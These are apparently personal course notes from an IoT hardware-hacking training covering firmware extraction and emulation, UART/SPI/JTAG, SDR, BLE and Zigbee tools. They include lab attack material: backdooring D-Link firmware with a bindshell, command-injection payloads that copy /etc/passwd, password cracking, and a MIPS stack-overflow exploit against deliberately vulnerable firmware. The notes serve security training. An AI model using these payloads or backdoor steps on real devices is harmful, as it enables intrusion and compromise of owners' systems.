Skipped 15, 16 and 17 -> Need Hardware to test


Instructor: Aditya Gupta
adi@attify.com


Hardware I need:

http://uk.farnell.com/microchip/24lc64-i-sn/serial-eeprom-64kbit-400khz-soic/dp/9758070
	I bought the EEProm listed below




Hardware I already have:

Bus Pirate:
https://www.sparkfun.com/products/12942
https://www.sparkfun.com/products/9556
	Tutorial: http://dangerousprototypes.com/docs/Bus_Pirate_101_tutorial

Alligator clip and cable:
https://www.amazon.com/CPT-063-Test-Clip-SOIC8-Pomona/dp/B00HHH65T4/ref=pd_lpo_328_tr_t_3?_encoding=UTF8&psc=1&refRID=E4D1BF4339YZ2A8SSK3T
https://www.amazon.com/FTDI-C232HM-DDHSL-0-Assembly-USB-MPSSE-Output/dp/B00HKK4SCO/ref=sr_1_1?s=industrial&ie=UTF8&qid=1490113636&sr=1-1&keywords=c232hm+ddhsl-0


USB to TTL Serial Cable
https://www.amazon.com/Rapsberry-TTL-232R-RPI-Compatible-Programming-EZSync012/dp/B015ME2WKO/

IEIK SDRMCX RTL-SDR, FM+DAB, DVB-T USB Stick Set with RTL2832U & R820T:
https://www.amazon.com/IEIK-RTL2832U-Low-Cost-Software-Compatible/dp/B00SXZDUAQ/ref=sr_1_6?s=electronics&ie=UTF8&qid=1481738467&sr=1-6&keywords=rtl+sdr

Arduino:
https://www.amazon.com/ARDUINO-A000005-DEV-ATMEGA328-NANO/dp/B003YVL34O

SparkFun Bee Shield for Arduino:
https://www.amazon.com/gp/product/B01B272ZUW/ref=ox_sc_act_title_1?ie=UTF8&psc=1&smid=A3AXF9ILYGHP7A

I2C EEPROM - 256kbit
https://www.sparkfun.com/products/525

Ubertooth One - Bluetooth Experimentation:
https://www.sparkfun.com/products/10573

KEDSUM CP2102 Module STC Download Cable USB to TTLS 6 pin Serial Converter for STC:
https://www.amazon.com/KEDSUM%C2%AE-CP2102-Module-Download-Converter/dp/B009T2ZR6W/

ATMEL - ATAVRRZUSBSTICK - AT86RF230, AT90USB1287, ZIGBEE, RZ USB Stick:
https://www.amazon.com/ATMEL-ATAVRRZUSBSTICK-AT86RF230-AT90USB1287-STARTER/dp/B00DK83TOI
	Documentation and such:
	   https://www.element14.com/community/docs/DOC-67532/l/avr-rz-usb-stick-module
	

IoT Smart Plug for hacking:
https://www.amazon.com/Kankun-Socket-Remote-iPhone-Smartphone/dp/B00N8N5NNK


Damn Vulnerable Firmware:
	https://github.com/praetorian-inc/DVRF


attifyos:
https://www.dropbox.com/sh/xrfzyp1ex2uii53/AAAF0mdA1qFaEBDYZoIxaQRma?dl=0
	Use Windows 7-zip to unzip downloaded files
	User: oit
	Pass: password@123


Shodan -> Search engine for Internet of Things!
	www.shodan.io

binwalk -> extract filesystem from firmware and root.squashfs files
	binwalk <firmware name>
	binwalk -e <firmware-name>
		-e extraction
		will also show uImage header (uboot bootloader) and CPU type (MIPS)
	binwalk -E <firmware-name>
	binwalk -W <firmware-name>


grep -iRn 'telnet' .
	-n line number


file bin/busybox -> will tell you what architecture the binary is meant for (MIPS)

readelf -h bin/busybox -> gives info about binary too



kcrypt.py -> decrypt packet that is using AES encryption from Wireshark/TCPDump
	Open kcrypt.py script and search for key and add the AES key to the line
		key = “add key here”
		str1=“”.decode(‘hex’)
			In Wireshark:
				right click the packet -> copy -> bytes as a hex stream
			paste in the value to the str1, 2, 3 and 4
			if I don’t use all of them comment the lines out.
	
	Then run “python kcrypt.py”. It will show decrypted packet values


	kkeps_controler.py
		https://github.com/0x00string/kankuncontroller
		add IP and MAC address to script
		
		Fill in:
			RHOST
			RMAC
			SSID
			WLANKEY (blank or “”)
			Key (should be fdsl;mewrjope456fds4fbvfnjwaugfo)


***********************************************************************************
QEMU to execute a single binary
***********************************************************************************
	
Using QEMU to run single binary
	which qemu-mips-static
	cd <to squashfs directory/root of file system>
	cp /usr/bin/qemu-mips-static .
	chmod +x qemu-mips-static
	sudo chroot . ./qemu-mips-static ./bin/busybox
		this runs a single command that uses MIPS architecture 
		and does not emulate the entire environment


***********************************************************************************
Firmware emulation made easy 
***********************************************************************************

Firmware emulation made easy:
	cd fat
	cp ~/firmwares/Dlink_firmware.bin .
	fat.py
		absolute path: Dlink_firmware.bin
		brand: Dlink
		password: firmadyne
		password: firmadyne


	Dlink_firmware.bin -> D-Link DIR-300
	http://192.168.0.1
		Login: admin
		Pass: N/A
	Arch:	MIPS

	TEW-733GR_FW102B01.bin -> TrendNet N300 Wireless Gigabit Router (TEW-733GR)
	http://192.168.10.1
		Login: admin
		Pass: N/A
	Arch:	MIPS

	k

***********************************************************************************
Extract, modify and rebuild firmware 
***********************************************************************************

	
Extract firmware, modify and rebuild:
	cd ~/tools/firmware-mod-kit
	./extract-firmware.sh Dlink_firmware.bin

	cd into directory and make changes.

	Find a startup script that we can add a netcat listener to
		/etc/init.d/S10system.sh -> symlink to /etc/scripts/system.sh
	add the following to the "start)" section:
		echo "Starting Backdoor"
		/etc/templates/bindshell

	Source code for back door on MIPS platform:
		https://gist.github.com/OsandaMalith/a3b213b5e7582cf9aac3
		Source code below in Bindshell Source Code section 
	
	Compile source code using gcc for MIPS architecture:
		cd ~/tools/buildroot-2015.11.1/output/host/usr/bin
		cp ~/lab/additional/bindshell.c . 
		./mipsel-buildroot-linux-uclibc-gcc bindshell.c -static -o bindshell
		sudo mv bindshell ~/tools/firmware-mod-kit/Dlink_firmware/rootfs/etc/templates

	Build new firmware:
		cd ~/tools/firmware-mod-kit/
		./build-firmware.sh Dlink_firmware/ -nopad -min
			-nopad -> no padding
			-min   -> block size?

		cd Dlink_firmware/
		ls -> should show "new-firmware.bin"
		
	Run new firmware in emulator:
		cp new-firmware.bin ~/tools/fat/
		cd ../fat
		./fat.py
			absolute path: new-firmware.bin
			brand: Dlink
			password: firmadyne
			password: firmadyne
		Test access to website: http://192.168.0.1
		nc 192.168.0.1 9999
		ls



***********************************************************************************
ARM emulation using QEMU
***********************************************************************************



Execute the ARM environment using QEMU:
	cd lab/Qemu/Qemu copy/
	qemu-system-arm -M versatilepb -kernel vmlinuz-2.6.32-5-versatile -initrd initrd.img-2.6.32-5-versatile -hda debian_squeeze_armel_standard.qcow2 -append "root=/dev/sda1" -m 256 -redir tcp:2222::22

	or
	sh ./Launchvm.sh
			
	then ssh into the ARM vm on port 2222
		ssh root@localhost -p 2222	#password is 'exploit'

	cat /proc/cpuinfo
		you will see it is an ARM processor

	you can press CTRL-ALT if QEMU grabs control of mouse and keyboard




***********************************************************************************
Diff Firmwares
***********************************************************************************

kdiff3 - diff in different folders GUI tool
 A -> select squashfs-root directory for old firmware
 B -> select squashfs-root directory for new firmware





***********************************************************************************
Command Injection
***********************************************************************************

Examples in post body:
macAddress=112233112233|cp /etc/passwd /home/www/jimmy.txt #&reginfo=0&writeData=Submit
macAddress=112233112233;cp /etc/passwd /home/www/jimmy.txt #&reginfo=0&writeData=Submit
	note the # at the end of the request



***********************************************************************************
Password cracking with John the Ripper
***********************************************************************************
copy /etc/passwd and /etc/shadow to john directory
unshadow passwd shadow > combined.txt
john --wordlist=password.list combined.txt
john --show combined.txt



***********************************************************************************
Radare2 - Binary analysis, debugging and exploitation
***********************************************************************************
Reverse engineering architecture for ARM and MIPS
Good alternative to IDA

Install:
	git clone https://github.com/radare/radare2.git
	cd radare2
	./sys/install.sh

	Configure radare2; see the “Configuration Properties” of the below 
		cheetsheet for more options:
		vi ~/.radare2rc and put the following in it:
			# Show comments at right of disassembly if they fit in screen
			e asm.cmtright=true
			
			# Shows pseudocode in disassembly. Eg mov eax, str.ok = > eax = str.ok
			e asm.pseudo = true
			
			# Use UTF-8 to show cool arrows that do not look like crap :)
			e scr.utf8 = true
		Further, you can use Ve in radware2 to set these manually but they do not persist

Radare2 cheetsheet:
	https://github.com/pwntester/cheatsheets/blob/master/radare2.md

Radare2 Documentation:
	https://github.com/jaijin/workshop2015
	https://radare.gitbook.io/radare2book/content/


Extract Damn Vulnerable Firware with binwalk:
	bin walk -e DVRF_v03.bin  
	cd _DVRF_v03.bin.extracted/squashfs-root

	rabin2 -I ./pwnable/Intro/stack_bof_01
		Returns info on binary. Note Class, Arch, Bits and endian
	
Run Radare2 with binary to analyze:
	radare2 -a mips -b 32 ./pwnable/Intro/stack_bof_01
		aa	#stands for analyze all, always run this
		a?	#shows help for all commands starting with a. af? afl?
		afl	#list all funcations
		
		pd 40 @ sym.main
			prints dissassembly for 40 places at sym.main

		iz -> print strings in the data section of the binary. 
		izz -> print strings in the whole binary

		VV -> Requires GUI/Web Browser
		v -> navigate binary for analysis
	
	
	
***********************************************************************************
MIPS Exploitation 
***********************************************************************************
Using Damn Vulnerable Router Firmware we will Attach a debugger to a binary:

Install gdb multiarchitecture:
	sudo apt-get install gdb-multiarch



Command to emulate and execute individual binary:
	cd tmp/__DVRF_v03.bin.extracted/squashfs-root
	cp /usr/bin/qemu-mipsel-stat .
	sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01
		command will require an argument

	Run command again with Argument
	sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 AAABBB


	1. Run command with -g option to attach a debugger:
	sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAABBB
		qemu-mipsel-static is now listening for a debugger to attach on port 1234

	2. Run gdb-multiarch gdb and attach to qemu-mipsel-static:
	gdb-muitiarch pwnable/Intro/stack_bof_01
		target remote 127.0.0.1:1234
		set architecture mips
		info functions
		disassemble main
		c
			Look back at qemu and you will see that execution completed

	1. Run qemu command but this time inject 100 characters as the input:
		First generate the characters using pattern.pl:
			Pattern URL:
			https://securitythoughts.wordpress.com/2010/03/18/tool-unique-pattern-generator-for-exploit-development/
			cd tool
			perl pattern 100
			copy output to clipboard
		cd __DVRF_v03.bin.extracted/squashfs-root
		sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 “Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9”
	2. back to gdb:
		target remote 127.0.0.1:1234
		c
			You will receive a set fault
		info registers
			Note the PC value. It should be 41386741 for the “A8gA”. It’s in hex.
			Convert 41386741 to ascii from Hex and it should be A8gA
		Find the offset to where this value exists:
			cd tools
			perl pattern.pl 300 Ag8A
				offset should be 204. We can now overwrite this with our code
		info functions
			This will show us the address of dat_shell which should be 0x00400950


	1. Lets run this process again, but this time lets inject 204 characters
		sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`echo -e ‘\\x50\\x09\\x40’`”
			Address is of dat_shell in little endian format	
			echo -e causes echo to escape back slashes
	2. In GDB:
		target remote 127.0.0.1:1234
		b dat_shell
			sets a breakpoint in dat_shell
		c
		c

		This still fails since at the address 400950 it references GP
		GP’s (global pointer) being overwritten can cause the program
		to crash.  Looking at radare2 we can see the address that does 
		not include a GP. (40095c)
			[0x00400630]> pd 40 @ sym.dat_shell
			/ (fcn) sym.dat_shell 196304
			|           0x00400950    05001c3c     lui gp, 0x5
			|           0x00400954    80839c27     addiu gp, gp, -31872
			|           0x00400958    21e09903     addu gp, gp, t9
			|           0x0040095c    e0ffbd27     addiu sp, sp, -32

	Run this and it should work:
	sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 “AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`echo -e ‘\\x5c\\x09\\x40’`”




***********************************************************************************
Serial Interfacing	
***********************************************************************************

Examples of serial communication:
	RS232, PS/2, USB, HDMI, Ethernet, SPI, I2C, UART, CAN, PCI, JTAG, etc.

Serial Interface:	
	Debug outputs
	shells

i2c and SPI Interfaces:
	EEPROM data sniffing and injection
	Memory Dumping
	Debug output
	Device Management

JTAG Interface:
	Firmware Dumping
	Firmware Upgrades
	Testing and Debugging the device


UART -> Universal Asynchronous Receiver Transmitter
	Typical 3-5 pins 
	Identify Pins:
		Tx:  Transfer
		Rx:  Receive
		Vcc: Voltage
		GND: Ground

		Connect Transfer on IoT to Receive on buspirate
		Connect Receive on IoT to Transfer on buspirate

	Use multimeter, put it in continuity mode (looks like sound) to find GND (ground)
	place black probe of multimeter on any metallic surface (ground) like nic port, etc.
	place red probe on the pin to be tested. When you hear sound, you found ground

	VCC is not used for UART, but it helps identify Tx and Rx. Put multimeter in voltage 
	mode. Put black probe on ground. Find pin that gives constant voltage, that is VCC.

	Tx -  Voltage changes on Tx pin as bits are transferred.

	Rx - remaining pin should be Rx.

	May need this when connecting to UART pins:
		echo && /bin/sh

***********************************************************************************
SPI and I2C
***********************************************************************************
SPI - Serial Peripheral Interface - Synchronous
	Interface bus used to send data between micro controllers and small 
	peripherals

	CS - Chip Select
	CLK - Clock - keeps chips in sync
	MOSI - Master Out Slave In
	MISO - Master In Slave Out

	Active low

I2C - pronounced as both I-squarce-C and I-two-C - Synchronous
	UART is asynchronous, therefore devices must agree ahead of time on data rate
	Uses two bidirectional lines:
		SDA - data line, bidirectional
		SCL - clock

Use Bus Pirate to connect:
	http://dangerousprototypes.com/docs/images/thumb/1/1b/Bp-pin-cable-color.png/600px-Bp-pin-cable-color.png

	Default Layout:
	GND - Black	3v3 - White
	+5v - Gray	ADC - Purple
	VPU - Blue	AUX - Green
	CLK - Yellow	MOSI - Orange
	CS - Red	MISO - Brown

	With my Cable:
	GND - Brown	3v3 - Red
	+5v - Orange	ADC - Yellow
	VPU - Green	AUX - Blue
	CLK - Purple	MOSI - Gray
	CS - White	MISO - Black

	You should connect it to Ground (GND) if the target devices is active low
	If the target device is active high then connect to the VCC (3.3/5V)

	BUS Pirate IO PIN Header:
	Mode	MOSI	CLK	MISO	CS
	HiZ
	1-Wire	OWD
	UART	TX		RX
	I2C	SDA	SCL
	SPI	MOSI	CLOCK	MISO	CS
	JTAG	TDI	TCK	TDO	TMS


Flashrom - is a utility for identifying, reading, writing, verifying and erasing flash chips.
	apt-get install flashrom

	flashrom -L |grep -i “macronix”
		returns list of macronix chips

	sudo flashrom -p ft2232_spi:type=232H -r iotdevice.bin -V -c “MX25L3206E/MX25L3208E”
		-p ft2232_spi:type232H 	-> programmer device 
		-r iotdevice.bin -> read flash and save to file iotdevice.bin
		-V -> verbose
		-c MX25L3206E/MX25L3208E -> chip names

	sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r test.bin -V


***********************************************************************************
Writing and Reading EEPROM with an Arduino
***********************************************************************************

My EEPROM 24LC256
http://ww1.microchip.com/downloads/en/DeviceDoc/20001203U.pdf


Pin layout:

8 7 6 5
- - - -
|      |
|.     |
- - - -
1 2 3 4


Arduino analog pin 4 to EEPROM pin 5
Arduino analog pin 5 to EEPROM pin 6
Arduino 5V to EEPROM pin 8
Arduino GND to EEPROM pins 1,2,3,4
Leave pin 7 on the EEPROM open or tie it to GND otherwise the EEPROM will be write

http://playground.arduino.cc/Code/I2CEEPROM

Install Arduino IDE:
	apt-get install arduino
	Sample programs, etc. in /usr/share/arduino

Copy program from link above to write_eeprom.ino
load it into the Arduino IDE
	Find the section “char somedata[] = “this is data from the eeprom”; //data to write
		change this to something more meaningful
	Change all references from:
		Wire.send to Wire.write
		Wire.receive to Wire.read

	For actual source code, see “write_eeprom source code” section below

	Upload code in Arduino IDE using upload button

	Open “Serial Monitor” from the Tools menu and you will see the output
		or
	screen /dev/ttyACM0 9600
		should see what we added to the EEPROM



***********************************************************************************
JTAG
***********************************************************************************

JTAG - Joint Test Action Group

Typically 4 (sometimes 5) pins
	Test Data In (TDI)
	Test Data Out (TDO)
	Test Mode Select (TMS)
	Test Clock (TCK)
	Test Reset (TRST)

JTAG Pins are usually broken, so you must solder the headers


JTAGulator - Hardware helps find pinouts of JTAG Pins
	http://www.grandideastudio.com/jtagulator

Identifying JTAG pins (TCK, TMS, TDO and TDI) using Arduino and JTAGenum:
	https://github.com/cyphunk/JTAGenum

	Wire Arduino Uno:
	Digital GND	-> GND on IoT
	Digital 2	-> JTAG Pin
	Digital 3	-> JTAG Pin
	Digital 4	-> JTAG Pin
	Digital 5	-> JTAG Pin
	Digital 6	-> JTAG Pin
	
	Launch Arduino IDE, load jtagenum. (see jtagenum source code section)
	Goto Tools -> Serial Port -> select ttyACM0
	Goto Tools -> Board -> Arduino UNO
	upload jtagenum to Arduino -> File -> Open -> select jtagenum
	open Serial Monitor in Arduino IDE (115200 baud in lower right corner)
	type “s” for scan

	Output should look like:
		FOUND! ntrst:DIG_2 tck:DIG_6 tms:DIG_5 tdo:DIG_4 tdi:DIG_3 IR length: 4
		DIG_2 is Digital pin 6 on the Arduino


BUS Pirate IO PIN Header:
	Mode	MOSI	CLK	MISO	CS
	HiZ
	1-Wire	OWD
	UART	TX		RX
	I2C	SDA	SCL
	SPI	MOSI	CLOCK	MISO	CS
	JTAG	TDI	TCK	TDO	TMS


Debugging using JTAG and Bus Pirate or Bus Blaster:
	Get Bus Pirate Drivers:
		http://www.ftdichip.com/Drivers/CDM/CDM%20v2.12.24%20WHQL%20Certified.zip
	

	OpenOCD with Buspirate:
		http://dangerousprototypes.com/docs/Gonemad%27s_Bus_Pirate/OpenOCD_walk_through
		http://dangerousprototypes.com/blog/2010/04/15/bus-pirate-openocd-walk-through/
		http://bgamari.github.io/posts/2012-03-28-jtag-over-buspirate.html

	Install OpenOCD:	
		sudo apt-get install openocd

	OpenOCD configuration files for bus_pirate:
		https://github.com/arduino/OpenOCD/blob/master/tcl/interface/buspirate.cfg
		Also located in:
			/usr/share/openocd/scripts/interface/buspirate.cfg (after install)

	OpenOCD Chip configuration files:
		/usr/share/openocd/scripts/target/
		https://github.com/esden/openocd/tree/master/tcl/board
		https://github.com/arduino/OpenOCD/blob/master/tcl/interface/buspirate.cfg
		https://github.com/arduino/OpenOCD/blob/master/tcl/board/mbed-lpc1768.cfg


	Commands to do dump flash:	
		sudo openocd -c “telnet_port 4444” -f ./buspirate.cfg -f <chip>.cfg
			-c “telnet_port 4444” -> command to have openocd run
			-f buspirate.cfg -> configuration of buspirate
			-f <chip>.cfg -> configuration of board being tested
				Hard part is finding correct cfg for your board
				see OpenOCD Chip configuration files above

		In another terminal:
		sudo telnet localhost 4444
			halt
			fast banks
				will look something like this:
				lpc1768.flash at 0x00000000, size 0x00080000, buswidth…
				note the address and size
			dump_image flash.bin 0x0 0x80000

		In another terminal:
		stings flash.bin
			should see contents of the dumped flash

		Launch the Bless Hex editor and load flash.bin:
			Search for mbed, password, etc.

		Back in telnet terminal:
			reg 	#shows registers

	
	GDB with openocd:
		sudo gdp openocd -f buspirate.cfg -f /board/mbed-lpc1768.cfg
		run debugging as normal
			bypass login prompts, prove escalation, modify registers, etc.

		
***********************************************************************************
SDR - Software Defined Radio
***********************************************************************************
Common Communication Protocols:
	WiFi
	Cellular
	BLE - Bluetooth low energy
	Zigbee - 
	NFC - 
	ZWave - 

Hardware:
	Funcube Dongle Pro
	RTL-SDR
	HackRF
	BladeRF
	USRP
	Matchstiq

Software:
	GNURadio
	GrOsomoSDR
	Linrad
	SDR#

Signals are time varying quantities which carry information:
Signals:
	Analog Signals:
		Denoted by sine wave
		Easily affected by noise
		Thermometer, human voice are examples of analog signals
	Digital Signals:
		Sequence of values
		Finite range - 0 or 1
		Most electronic devices use Digital Signals


Frequency Bands:
	AM Radio: 			535 KHz - 1.7 MHz
	FM Radio: 			88 - 108 MHz
	Air Traffic control radar: 	0.96 - 1.215 GHz
	WiFi 802.11b and 802.11g:	2.5 GHz
	WiFi 802.11a:			5 GHz
	Bluetooth:			2.4 GHz
	X-Rays: 			3.10^6 to 3x10^9 Hz
	ISM Band:			

What are the frequencies being used by IoT device?
What modulation is being used, so we can demodulate it to GNU Radio?
What is the Data and sample rate?
Is there any frequency or channel hopping?

GNU Radio Companion - GUI for GNU Radio
	Example use from a Terminal:
	gnuradio-companion
		Use the search to find “Signal Source”, drag it to the main window
		search for “FFT”, select “WX GUI FFT Sink”, drag it to the main window
		search for “throttle”, drag it to the main window

		click the “Out” on “Signal Source” and “In” on “Throttle”. 
		click “Out” on “Throttle” and “In” on “WX GUI FFT Sink”

		click on “Execute the flow graph” (gears icon) to execute
		click on “Autoscale” for a better view.


Captured AM signal:
	https://www.csun.edu/~skatz/katzpage/sdr_project/sdr/sw_usrp.dat.zip
	Initial sampling rate: 256000
	USRP was set to 710KHz
	Put it as a source in GNU Radio companion
	Process the signal to hear it in audible form

	https://www.csun.edu/~skatz/katzpage/sdr_project/sdr/grc_tutorial1.pdf
	https://www.csun.edu/~skatz/katzpage/sdr_project/sdr/grc_tutorial2.pdf
	https://www.csun.edu/~skatz/katzpage/sdr_project/sdr/grc_tutorial3.pdf
	https://www.csun.edu/~skatz/katzpage/sdr_project/sdr/grc_tutorial4.pdf



RTL-SDR -> Antenna
	sudo apt-get install rtl-sdr gqrx-sdr
	sudo udevadm trigger
	Create a file /etc/modprobe.d/blacklist-rtl.conf and put the following in it:
		blacklist dvb_usb_rtl28xxu
		blacklist rtl2832
		blacklist rtl2830
	sudo reboot
	rtl_test
	If rtl_test is successful run gqrx
	gqrx
		click the power button
		Set Mode to: “WFM (stereo)” or “Demod Off” for devices using FM
		Turn the gain up for volume
		you should see FM radio signals if they are strong enough
		


***********************************************************************************
BLE -> Bluetooth Low Energy
***********************************************************************************

37 Data Channels
3 Advertisement broadcast channels



GATT Services -> standard services defined by bluetooth specifications: (heart rate, 
Device information, scan parameters, user data, etc)
https://www.bluetooth.com/specifications/gatt/services

GATT Characterisitics -> characteristics are defined attribute types that contain a single
value. (Heart rate, time, age, etc)
https://www.bluetooth.com/specifications/gatt/characteristics


Each service is identified by a unique UUID
	

Pairing Modes:
	JustWorks: TK all zeroes (000000)
	6-digit passkey: 0 - 999999: can be brute forced using tools like Crackle
	Out of band: Still not widely used

TK	Temporary Key
STK	Short Term Key
LTK	Long Term Key - used to encrypt communication


Crackle -> cracks BLE key exchange
	https://lacklustre.net/projects/crackle/
	Install:
		sudo apt-get install libpcap0.8-dev
		git clone https://github.com/mikeryan/crackle.git
		cd crackle
		make
		wget https://lacklustre.net/bluetooth/crackle-sample.tgz
		tar -xzvf crackle-sample.tgz
	
		Use Wireshark on the MAC or version 1.12 or greater or see below
			in ubertooth for installation in legacy Wireshark
			Upgrade Wireshark on Ubuntu 14.0:
				sudo add-apt-repository ppa:wireshark-dev/stable
				sudo apt-get update
				sudo apt-get install Wireshark			

		In Wireshark goto Edit -> Preferences -> Protocols -> DLT_USER -> Edit:
			DLT: User 0 (DLT=147)
			Payload protocol: btle

				
	Running crackle: (pcap file must contain a complete pairing conversation
		crackle -i ltk_exchange.pcap -o foo.pcap
			-i input file
			-o output file

			make note of the LTK that is found

		crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i encrypted_known_ktk.pcap -o decrypted.pcap
		Open decrypted.pcap in Wireshark 2.0 (Mac Version) or higher



Ubertooth One -> Bluetooth sniffer
	Installation tools:
		https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide

	sudo apt-get install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev \
pkg-config libpcap-dev python-numpy python-pyside python-qt4
	
	cd Downloads
	wget https://github.com/greatscottgadgets/libbtbb/archive/2015-10-R1.tar.gz -O libbtbb-2015-10-R1.tar.gz
	tar xf libbtbb-2015-10-R1.tar.gz
	cd libbtbb-2015-10-R1
	mkdir build
	cd build
	cmake ..
	make
	sudo make install	

	cd ~/tools
	wget https://github.com/greatscottgadgets/ubertooth/releases/download/2015-10-R1/ubertooth-2015-10-R1.tar.xz -O ubertooth-2015-10-R1.tar.xz
	tar xf ubertooth-2015-10-R1.tar.xz
	cd ubertooth-2015-10-R1/host
	mkdir build
	cd build
	cmake ..
	make
	sudo make install

	For Wireshark:
		In Wireshark goto Edit -> Preferences -> Protocols -> DLT_USER -> Edit:
			DLT: User 0 (DLT=147)
			Payload protocol: btle

	Using Ubertooth:
		ubertooth-util -v 	-> tells you firmware version
		ubertooth-scan		-> performs hci and ubertooth scan. Helps 
					determine LAP (Lower Address Part of the 
					BD_ADDR)
					http://ubertooth.blogspot.com/2014/06/discovering-bluetooth-uap.html
					-f  Follow connection (btle hops channels, this follows connection)
					-p  Promiscous mode
					-c  save to file or pipe (use with wireshark)



		First use ubertooth for spectrum analysis:
			wget https://www.kismetwireless.net/code/spectools-2016-01-R1.tar.xz
			tar xf spectools-2016-01-R1.tar.xz
			cd spectools-2016-01-R1
			./configure
			make
			sudo make install
			run spectool: spectool_gtk
				or
			ubertooth-specan-ui

			
		
		ubertooth-scan -s
		ubertooth-btle -f

		Pipe output to wireshark:
			mkfifo /tmp/btle
			ubertooth-btle -f -c /tmp/btle
			#Open Wireshark -> Capture Menu -> Options -> Manage Interfaces -> Pipes -> + -> /tmp/btle
				Click start
			   or
			wireshark -k -i /tmp/btle
			
				
						


hcidump -> dump communication between phone (android) and bluetooth chip 	


***********************************************************************************
Zigbee
***********************************************************************************
Zigbee -> communication protocol in IoT devices. Operates on 2.4 GHz, range 10-100 mtr Line of Sight

	Communication may or may not be encrypted

	Can perform sniff, replay and MITM attacks


KillerBee framework: used to attack Zigbee and 802.15.4 networks
	suite includes: zbdump, dbdsniff, zbreplay, etc.

	Flash Killerbee on RZRaven USB stick:
		Download from https://github.com/riverloopsec/killerbee
		git clone https://github.com/riverloopsec/killerbee.git
		Installation and prerequisets:
			apt-get install python-gtk2 python-cairo python-usb python-crypto python-serial python-dev libgcrypt-dev
			wget https://bitbucket.org/secdev/scapy-com/get/cc06add6dbd9.zip
			cd secdev-scapy-com-cc06add6dbd9
			sudo python setup.py install
			
			cd ../killerbee
			python setup.py install
		
		
		Video for flashing RZUSBSTICK with killerbee firmware:
			https://www.youtube.com/watch?v=s5wkPWEt8RQ

			Need the following hardware to perform flash on RZUSBSTICK as listed on github:
				https://github.com/riverloopsec/killerbee
				Atmel AVR Dragon On-Chip Programmer (ATAVRDRAGON)
				Atmel 100-mm to 50-mm JTAG Standoff Adapter (ATAVR-SOAKIT)
				50mm male-to-male header (Digi-Key part S9015E-05)
				10-pin (2x5) 100-mm female-to-female ribbon cable (Digi-Key part H3AAH-1018G-ND)


		Running Killerbee on RZ usb stick:
			zbid 				Shows product name and serial number
			zbstumbler -v			Scans channels looking for zigbee traffic, note channel discovered
			zbdump -c 14 -c test.pcap	Captures data on channel 14 and saves to test.pcap
				open test.pcap in Wireshark, data could be encrypted

			
			




***********************************************************************************
ARM Architecture	
***********************************************************************************
ARM - Advanced RISC Machines
	optimized for low power and performance

	ARM Mode (4 byte instructions)
	Thumb mode ( 2 byte instructions)

Registers 31 32-bit registers
	16 are userful/visible
	

ARM Registers:
r0
r1			R0 - R3 : To store Arguments
r2
r3
r4
r5			
r6
r7
r8
r9
r10 (SL)		
r11 (FP)			
r12 (IP)		IP - Intra Procedural Call Register
r13 (SP)		Stack Pointer - Points to the top of the stack
r14 (LR)		LR - saves the PC when entering a subroutine
r15 (PC)		Program Counter (PC) - Next instruction to be fetched 
				and executed (~ EIP)
CPSR			CPSR : Results of recent operations using Flags, 
				Interrupts and Modes



IP	Intra Procedural Call Register
PC 	Program Counter
LR	Link Register
SP 	Stack Pointer
CPSR	Current Program Status Register


ADD
LDR	loads data from memory into registers
	LDR r0, [r1]   :Will load r0 with contents of memory address pointed to by r1
SUB
STR	Store a registry value in Memory
	STR R0, [R1, #0x1337]   :Stores value of R0 at R1+0x1337

STM	Store Multiple
LDM	Load Multiple
MOV	move value from one register to another
REV	reverses the byte order
CMP	Compares two different values, returns with a 0 or 1

Branching Instructions:
B<label>	Branch to target address
BL,BLX <imm>	Call a subroutine
		Call a subroutine, change instruction set
BLX <reg>	Call a subroutine, optionally change instruction set
BX		Branch to target address, change instruction set
CBZ		Compare and Branch on Zero
CBNZ		Compare and Branch on Nonzero
TBB		Table Branch (byte offsets)
TBH		Table Branch (halfword offsets)

Addressing modes and offsets:
offset Addressing		[R0, 0x1337]	Access memory at R0+0x1337
Pre-Indexed Addressing		[R0, 0x1337]!	Updating R0 to be R0+0x1337. Then accessing R0
Post-Indexed Addressing	[R0], 0x1337 	Accessing memory at R0, then adding 0x1337 to it
Constant			MOV R0, #1	Immediate assignment

PUSH 		To add a data/value (SP decreases)
POP		To remove a data/value (SP increases)


EXAMPLE 1 (buffer_overflow.c)
-----------------------------
Example exploit using GDB:

Turn off ASLR -> Address space layout randomization
echo 0 > /proc/sys/kernel/randomize_va_space

